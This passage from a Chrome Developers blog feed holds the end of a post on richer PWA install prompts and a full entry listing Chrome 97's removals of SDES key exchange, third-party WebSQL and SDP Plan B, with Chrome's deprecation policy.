By\nvisiting &lt;code&gt;chrome://site-engagement/&lt;/code&gt;, you can see the sites that you\nare engaging with regularly. Using these scores, we could determine\nif a user is interested in a website. If the site was a PWA and the\nuser was engaged we would show them the install In-Product Help UI.\nThis meant that we only focused on engaged users and not annoy users\nwho may visit a site one time.&lt;/p&gt;\n&lt;p&gt;By using in-product help on desktop, we saw a greater than 100%\nincrease in PWA installation, showing that focusing on engaged users\nimproved the installability of web apps.&lt;/p&gt;\n&lt;h2 id=&quot;richer&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#richer&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Richer Install UI&lt;/h2&gt;\n&lt;p&gt;The install paradigm for most users is a store.\nSince the mid-2000&#39;s we have educated users that whenever they are\ninstalling an app, they will see a description, screenshots, and\nother metadata to help them decide if an app is something they\nwant.&lt;/p&gt;\n&lt;p&gt;With PWAs, the UI we showed once a user had decided to install a web\napp was relatively meager. So the team decided to explore a richer\ninstall experience that would give context to our users about the web\napp and enable developers to celebrate the PWA&#39;s that were on par\nwith native experiences.&lt;/p&gt;\n&lt;figure&gt;\n&lt;img alt=&quot;Richer install UI.&quot; decoding=&quot;async&quot; height=&quot;776&quot; loading=&quot;lazy&quot; sizes=&quot;(min-width: 800px) 800px, calc(100vw - 48px)&quot; src=&quot;https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/8kGMXy7tkoZMKr4y0qEY.jpg?auto=format&quot; srcset=&quot;https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/8kGMXy7tkoZMKr4y0qEY.jpg?auto=format&amp;w=200 200w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/8kGMXy7tkoZMKr4y0qEY.jpg?auto=format&amp;w=228 228w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/8kGMXy7tkoZMKr4y0qEY.jpg?auto=format&amp;w=260 260w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/8kGMXy7tkoZMKr4y0qEY.jpg?auto=format&amp;w=296 296w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/8kGMXy7tkoZMKr4y0qEY.jpg?auto=format&amp;w=338 338w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/8kGMXy7tkoZMKr4y0qEY.jpg?auto=format&amp;w=385 385w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/8kGMXy7tkoZMKr4y0qEY.jpg?auto=format&amp;w=439 439w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/8kGMXy7tkoZMKr4y0qEY.jpg?auto=format&amp;w=500 500w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/8kGMXy7tkoZMKr4y0qEY.jpg?auto=format&amp;w=571 571w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/8kGMXy7tkoZMKr4y0qEY.jpg?auto=format&amp;w=650 650w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/8kGMXy7tkoZMKr4y0qEY.jpg?auto=format&amp;w=741 741w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/8kGMXy7tkoZMKr4y0qEY.jpg?auto=format&amp;w=845 845w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/8kGMXy7tkoZMKr4y0qEY.jpg?auto=format&amp;w=964 964w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/8kGMXy7tkoZMKr4y0qEY.jpg?auto=format&amp;w=1098 1098w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/8kGMXy7tkoZMKr4y0qEY.jpg?auto=format&amp;w=1252 1252w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/8kGMXy7tkoZMKr4y0qEY.jpg?auto=format&amp;w=1428 1428w, https://wd.imgix.net/image/xizoeLGxYNf3VLUHc5BsIoiE1Af1/8kGMXy7tkoZMKr4y0qEY.jpg?auto=format&amp;w=1600 1600w&quot; width=&quot;800&quot;&gt;\n&lt;figcaption&gt;\nRicher Install UI, collapsed and expanded states.\n&lt;/figcaption&gt;\n&lt;/figure&gt;\n&lt;p&gt;Earlier this year, we launched &lt;a href=&quot;https://developer.chrome.com/blog/richer-pwa-installation/&quot;&gt;Richer Install&lt;/a&gt;,\nan extended install UI on Chrome on Android that allows developers to\nadd screenshots to their manifest. Developers can also add a\ndescription, which is recommended but not necessary. Due to this\nnewer UI, we saw an install rate for some PWAs double, showing that\nusers have greater confidence in installing web apps when we give\nmore context and richer experiences.. The desktop version of this UI\nis currently a work in progress.&lt;/p&gt;\n&lt;h2 id=&quot;conclusion&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#conclusion&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Conclusion&lt;/h2&gt;\n&lt;p&gt;The team has spent the last two years exploring and\nexperimenting with newer features in Chrome that have enabled and\nempowered PWA developers and helped to educate users about the\nbenefits of web experiences. There is still plenty of work we can\ndo, but collectively we can improve and enrich our users&#39; lives\nand further support the open web.&lt;/p&gt;\n</content>\n  </entry>\n  \n  \n  <entry>\n    <title>Deprecations and removals in Chrome 97</title>\n    <link href=\"https://developer.chrome.com/en/blog/deps-rems-97/\" />\n    <updated>2021-11-22T00:00:00+00:00</updated>\n    <id>https://developer.chrome.com/en/blog/deps-rems-97/</id>\n    \n    <author>\n      <name>Chrome Developers</name>\n    </author>\n    \n    <content type=\"html\">&lt;div class=&quot;aside aside--note&quot;&gt;\n&lt;p&gt;Visit ChromeStatus.com for lists of &lt;a href=&quot;https://www.chromestatus.com/features#browsers.chrome.status%3A%22Deprecated%22&quot;&gt;current deprecations&lt;/a&gt; and &lt;a href=&quot;https://www.chromestatus.com/features#browsers.chrome.status:%22Removed%22&quot;&gt;previous removals&lt;/a&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;p&gt;Chrome 97 beta was released on November 18, 2021 and is expected to become the\nstable version in late December, 2021.&lt;/p&gt;\n&lt;h2 id=&quot;remove-sdes-key-exchange-for-webrtc&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#remove-sdes-key-exchange-for-webrtc&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Remove SDES key exchange for WebRTC&lt;/h2&gt;\n&lt;p&gt;The SDES key exchange mechanism for WebRTC has been declared a MUST NOT in the\nrelevant IETF standards since 2013. The SDES specification has been declared\nhistoric by the IETF. Its usage in Chrome has declined significantly over the\nrecent year. Consequently &lt;a href=&quot;https://www.chromestatus.com/feature/5695324321480704&quot;&gt;it is\nremoved&lt;/a&gt; as of Chrome\n97.&lt;/p&gt;\n&lt;h2 id=&quot;remove-websql-in-third-party-contexts&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#remove-websql-in-third-party-contexts&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Remove WebSQL in third-party contexts&lt;/h2&gt;\n&lt;p&gt;&lt;a href=&quot;https://www.chromestatus.com/feature/5684870116278272&quot;&gt;WebSQL in third-party contexts is now removed&lt;/a&gt;.\nThe Web SQL Database standard was first proposed in April 2009 and abandoned in\nNovember 2010. Gecko never implemented this feature and WebKit deprecated it in\n2019. The W3C encourages\n&lt;a href=&quot;https://developer.mozilla.org/docs/Web/API/Web_Storage_API&quot;&gt;Web Storage&lt;/a&gt;\nand\n&lt;a href=&quot;https://developer.mozilla.org/docs/Web/API/IndexedDB_API&quot;&gt;Indexed Database&lt;/a&gt;\nfor those needing alternatives.&lt;/p&gt;\n&lt;h2 id=&quot;remove-sdp-plan-b&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#remove-sdp-plan-b&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Remove SDP Plan B&lt;/h2&gt;\n&lt;p&gt;The Session Description Protocol (SDP) used to establish a session in WebRTC has\nbeen implemented with two different dialects in Chromium: Unified Plan and Plan\nB. Plan B is not cross-browser compatible and &lt;a href=&quot;https://www.chromestatus.com/features/5823036655665152&quot;&gt;is hereby\nremoved&lt;/a&gt;.&lt;/p&gt;\n&lt;h2 id=&quot;deprecation-policy&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#deprecation-policy&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Deprecation policy&lt;/h2&gt;\n&lt;p&gt;To keep the platform healthy, we sometimes remove APIs from the Web Platform\nwhich have run their course. There can be many reasons why we would remove an\nAPI, such as:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;They are superseded by newer APIs.&lt;/li&gt;\n&lt;li&gt;They are updated to reflect changes to specifications to bring alignment and\nconsistency with other browsers.&lt;/li&gt;\n&lt;li&gt;They are early experiments that never came to fruition in other browsers and\nthus can increase the burden of support for web developers.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Some of these changes will have an effect on a very small number of sites. To\nmitigate issues ahead of time, we try to give developers advanced notice so they\ncan make the required changes to keep their sites running.&lt;/p&gt;\n&lt;p&gt;Chrome currently has a &lt;a href=&quot;http://www.chromium.org/blink#TOC-Launch-Process:-Deprecation&quot;&gt;process for deprecations and removals of\nAPI&#39;s&lt;/a&gt;,\nessentially:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Announce on the\n&lt;a href=&quot;https://groups.google.com/a/chromium.org/forum/#!forum/blink-dev&quot;&gt;blink-dev&lt;/a&gt;\nmailing list.&lt;/li&gt;\n&lt;li&gt;Set warnings and give time scales in the Chrome DevTools Console when usage\nis detected on the page.&lt;/li&gt;\n&lt;li&gt;Wait, monitor, and then remove the feature as usage drops.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;You can find a list of all deprecated features on chromestatus.com using the\n&lt;a href=&quot;https://www.chromestatus.com/features#deprecated&quot;&gt;deprecated filter&lt;/a&gt; and\nremoved features by applying the &lt;a href=&quot;https://www.chromestatus.com/features#removed&quot;&gt;removed\nfilter&lt;/a&gt;.
